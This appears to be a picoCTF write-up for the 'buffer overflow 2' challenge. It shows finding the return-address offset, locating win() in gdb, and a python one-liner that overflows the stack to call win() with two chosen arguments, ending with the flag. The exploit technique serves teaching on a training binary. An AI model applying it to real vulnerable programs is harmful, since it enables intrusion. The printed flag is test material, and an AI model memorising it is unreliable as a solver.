# buffer overflow 2
Binary Exploitation - 250 points

## Challenge 
> Alright, this time you'll need to control some arguments. Can you get the flag from this [program](vuln)? You can find it in /problems/buffer-overflow-2_4_ca1cb0da49310dd45c811348a235d257 on the shell server. 

[Source.](vuln.c)

## Hint
> 

## Solution

#### Find Offset
	$ pwn cyclic 200 | strace ./vuln
	--- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0x62616164} ---
	+++ killed by SIGSEGV +++
	Segmentation fault
	
	$ pwn cyclic -l 0x62616164
	112

#### Get addresses

	(gdb) b win
	Breakpoint 1 at 0x80485d1


`win     \xcb\x85\x04\x08`


---

#### Form payload

https://ucsd-progsys.github.io/131-web/static/img/stack-layout.png

The final format will be as follows:

	[112 bytes offset] + [return address towards win()] + [return address of win()] + [param1] + [param2]

Execute

	$ python -c 'print "\x00"*112 + "\xcb\x85\x04\x08" + "junk" + ("\xEF\xBE\xAD\xDE" + "\xDE\xC0\xAD\xDE")' | ./vuln 
	Please enter your string: 

	picoCTF{addr3ss3s_ar3_3asy30723282}Segmentation fault


## Flag

	picoCTF{addr3ss3s_ar3_3asy30723282}
